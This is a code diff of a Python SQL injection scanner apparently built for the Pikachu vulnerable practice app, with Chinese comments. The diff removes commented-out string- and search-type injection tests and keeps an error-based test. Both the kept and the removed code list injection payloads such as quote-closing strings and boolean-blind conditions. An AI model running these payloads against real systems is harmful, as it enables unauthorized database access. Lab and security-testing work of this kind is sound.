@@ -74,12 +74,6 @@ class PikachuSQLiScanner(SQLInjectionScanner):
         # 基于URL路径判断注入类型
         if 'sqli_id.php' in path:
             return '数字型注入', 'POST', self.test_numeric_injection
-        # elif 'sqli_str.php' in path:
-        #     return '字符型注入', 'GET', self.test_string_injection
-        # elif 'sqli_search.php' in path:
-        #     return '搜索型注入', 'GET', self.test_search_injection
-        # elif 'sqli_x.php' in path:
-        #     return 'XX型注入', 'GET', self.test_xx_injection
         else:
             # 默认使用xx型注入
             return 'XX型注入', 'GET', self.test_xx_injection
@@ -99,64 +93,12 @@ class PikachuSQLiScanner(SQLInjectionScanner):
 
         return True, 'POST', 'id', {'submit': '查询'}, "-1"
 
-    # def test_string_injection(self):
-    #     """测试字符型注入 (sqli_str.php)"""
-    #     self.print("\n[*] 开始测试字符型注入...")
-    #     if self.target_url and 'sqli_str.php' in self.target_url:
-    #         url = self.target_url
-    #     else:
-    #         url = f"{self.base_url}/vul/sqli/sqli_str.php"
-        
-    #     # 测试基于错误的注入
-    #     error_payload = "vince'"
-    #     response = self.send_request(url, params={'name': error_payload, 'submit': '查询'})
-    #     is_vul, db_type = self.is_vulnerable(response)
-    #     if is_vul:
-    #         self.print(f"[!] 字符型注入 - 发现基于错误的SQL注入漏洞！数据库类型: {db_type}")
-    #         return True, 'GET', 'name', None
-            
-    #     # 测试基于布尔的盲注
-    #     true_payload = "vince' AND '1'='1"
-    #     false_payload = "vince' AND '1'='2"
-    #     if self.check_boolean_based(url, true_payload, false_payload, 'GET', 'name'):
-    #         self.print("[!] 字符型注入 - 发现基于布尔的SQL注入漏洞！")
-    #         return True, 'GET', 'name', None
-            
-    #     self.print("[-] 字符型注入 - 未发现明显的SQL注入漏洞")
-    #     return False, None, None, None
-
-    # def test_search_injection(self):
-    #     """测试搜索型注入 (sqli_search.php)"""
-    #     self.print("\n[*] 开始测试搜索型注入...")
-    #     if self.target_url and 'sqli_search.php' in self.target_url:
-    #         url = self.target_url
-    #     else:
-    #         url = f"{self.base_url}/vul/sqli/sqli_search.php"
-        
-    #     # 测试基于错误的注入
-    #     error_payload = "a%'"
-    #     response = self.send_request(url, params={'name': error_payload, 'submit': '搜索'})
-    #     is_vul, db_type = self.is_vulnerable(response)
-    #     if is_vul:
-    #         self.print(f"[!] 搜索型注入 - 发现基于错误的SQL注入漏洞！数据库类型: {db_type}")
-    #         return True, 'GET', 'name', None
-            
-    #     # 测试基于布尔的盲注
-    #     true_payload = "a%' AND 1=1 AND '%'='"
-    #     false_payload = "a%' AND 1=2 AND '%'='"
-    #     if self.check_boolean_based(url, true_payload, false_payload, 'GET', 'name'):
-    #         self.print("[!] 搜索型注入 - 发现基于布尔的SQL注入漏洞！")
-    #         return True, 'GET', 'name', None
-            
-    #     self.print("[-] 搜索型注入 - 未发现明显的SQL注入漏洞")
-    #     return False, None, None, None
-
     def test_xx_injection(self):
         """测试XX型注入 (sqli_x.php)"""
         self.print("\n[*] 开始测试XX型注入...")
         url = self.target_url
         
-        # 测试不同的闭合方式, 这里可能还要改改
+        # 测试不同的闭合方式
         test_payloads = ['-1\'','-1\"', '-1\")', '-1`)', '-1\')', '-1%\'']
         is_vul, db_type = [], []
 
@@ -173,27 +115,6 @@ class PikachuSQLiScanner(SQLInjectionScanner):
                 if not a1:
                     self.print(f"[!] XX型注入 - 发现基于错误的SQL注入漏洞！使用Payload: {test_payloads[i]}")
                     return True, 'GET', 'name', None, test_payloads[i]
-
-
-        # for payload in test_payloads:
-        #     response = self.send_request(url, params={'name': payload, 'submit': '查询'})
-        #     is_vul, db_type = self.is_vulnerable(response)
-
-        #     response1 = self.send_request(url, params={'name': payload + " #", 'submit': '查询'})
-        #     is_vul1, db_type1 = self.is_vulnerable(response1)
-
-            # if is_vul and not is_vul1:
-            #     self.print(f"[!] XX型注入 - 发现基于错误的SQL注入漏洞！使用Payload: {payload}")
-            #     return True, 'GET', 'name', None, payload
-        
-        # 测试基于布尔的盲注
-        # true_payloads = ["1') AND ('1'='1", "1') AND 1=1 # "]
-        # false_payloads = ["1') AND ('1'='2", "1') AND 1=2 # "]
-        
-        # for i in range(len(true_payloads)):
-        #     if self.check_boolean_based(url, true_payloads[i], false_payloads[i], 'GET', 'id'):
-        #         self.print(f"[!] XX型注入 - 发现基于布尔的SQL注入漏洞！")
-        #         return True, 'GET', 'id', None, None
             
         self.print("[-] XX型注入 - 未发现明显的SQL注入漏洞")
         return False, None, None, None, None  
@@ -247,16 +168,6 @@ class PikachuSQLiScanner(SQLInjectionScanner):
                 vulnerabilities_found += 1
                 # 更新进度：发现漏洞，准备提取信息
                 self.update_progress(min(100, 10 + i * 20 + 5), f"{name}发现漏洞，提取信息")
-                
-                # 确定闭合模式
-                # if name == "数字型注入":
-                #     closing_pattern = "numeric"
-                # elif name == "字符型注入":
-                #     closing_pattern = "string"
-                # elif name == "搜索型注入":
-                #     closing_pattern = "search"
-                # elif name == "XX型注入":
-                #     closing_pattern = "xx"
                 
                 # 使用用户提供的URL或自动判断的URL
                 url = target_url
